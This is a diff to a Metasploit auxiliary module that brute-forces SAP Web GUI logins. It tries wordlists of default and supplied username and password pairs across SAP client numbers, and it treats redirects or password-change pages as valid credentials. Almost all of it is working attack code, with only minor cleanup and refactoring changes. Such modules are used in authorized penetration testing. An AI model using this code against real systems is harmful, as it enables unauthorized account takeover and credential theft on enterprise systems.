@@ -6,13 +6,13 @@
 ##
 
 ##
-# This module is based on, inspired by, or is a port of a plugin available in 
-# the Onapsis Bizploit Opensource ERP Penetration Testing framework - 
+# This module is based on, inspired by, or is a port of a plugin available in
+# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
 # http://www.onapsis.com/research-free-solutions.php.
-# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts
+# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
 # in producing the Metasploit modules and was happy to share his knowledge and
-# experience - a very cool guy. I'd also like to thank Chris John Riley, 
-# Ian de Villiers and Joris van de Vis who have Beta tested the modules and 
+# experience - a very cool guy. I'd also like to thank Chris John Riley,
+# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
 # provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
@@ -24,29 +24,28 @@ class Metasploit4 < Msf::Auxiliary
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::AuthBrute
-	
+
 	def initialize
 		super(
 			'Name' => 'SAP Web GUI Brute Force',
-			'Version' => '$Revision$',
 			'Description' => %q{
 				SAP Web GUI Brute Force.
 				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
+			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
 			'Author' => [ 'nmonkee' ],
 			'License' => BSD_LICENSE
 			)
 		register_options([
-		    OptString.new('URI',[true, 'URI', "/"]),
-		    OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-            OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
-            OptString.new('USERPASS_FILE',[false, '',nil]),
+			OptString.new('TARGETURI', [true, 'URI', '/']),
+			OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+			OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
+			OptString.new('USERPASS_FILE',[false, '',nil])
 			], self.class)
 		register_autofilter_ports([80])
 	end
-	
+
 	def run_host(ip)
-		uri = datastore['URI']
+		uri = datastore['TARGETURI']
 		if datastore['CLIENT'].nil?
 			print_status("Using default SAP client list")
 			client = ['000','001','066']
@@ -62,20 +61,17 @@ class Metasploit4 < Msf::Auxiliary
 			elsif datastore['CLIENT'] =~ /^\d{3}\z/
 				client.push(datastore['CLIENT'])
 				print_status("Brute forcing client #{datastore['CLIENT']}")
-			else  
+			else
 				print_status("Invalid CLIENT - using default SAP client list instead")
 				client = ['000','001','066']
 			end
 		end
 		saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
-              'Header'  => "[SAP] Credentials",
-              'Prefix'  => "\n",
-              'Postfix' => "\n",
-              'Indent'  => 1,
-              'Columns' => ["host","port","client","user","pass"])
-		if datastore['DEFAULT_CRED']
-			datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
-		end
+			'Header'  => "[SAP] Credentials",
+			'Prefix'  => "\n",
+			'Postfix' => "\n",
+			'Indent'  => 1,
+			'Columns' => ["host","port","client","user","pass"])
 		if datastore['USERPASS_FILE']
 			credentials = extract_word_pair(datastore['USERPASS_FILE'])
 			credentials.each do |u,p|
@@ -87,15 +83,15 @@ class Metasploit4 < Msf::Auxiliary
 				end
 			end
 		else
-			#todo
+			datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
 		end
 		print(saptbl.to_s)
 	end
-	
+
 	def bruteforce(uri,user,pass,cli)
 		begin
 			path = "sap/bc/gui/sap/its/webgui/"
-		    cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
+			cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
 			res = send_request_cgi({
 				'uri'    => "#{uri}#{path}",
 				'method' => 'POST',
@@ -110,19 +106,17 @@ class Metasploit4 < Msf::Auxiliary
 					'sap-client' => cli,
 					'sap-user' => user,
 					'sap-password' => pass,
-					'sap-language' => 'EN',
+					'sap-language' => 'EN'
 					}
 				})
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
 			print_error("[SAP] #{ip}:#{rport} - Service failed to respond")
-			return
-		end
-		
-		if res and res.code == 302
-			return true
+			return false
 		end
 
-		if res and res.code == 200
+		if res and res.code == 302
+			return true
+		elsif res and res.code == 200
 			if res.body =~ /log on again/
 				return false
 			elsif res.body =~ /<title>Change Password - SAP Web Application Server<\/title>/
@@ -133,7 +127,7 @@ class Metasploit4 < Msf::Auxiliary
 			end
 		else
 			print_error("[SAP] #{ip}:#{rport} - error trying #{user}/#{pass} against client #{cli}")
+			return false
 		end
-		return
 	end
 end
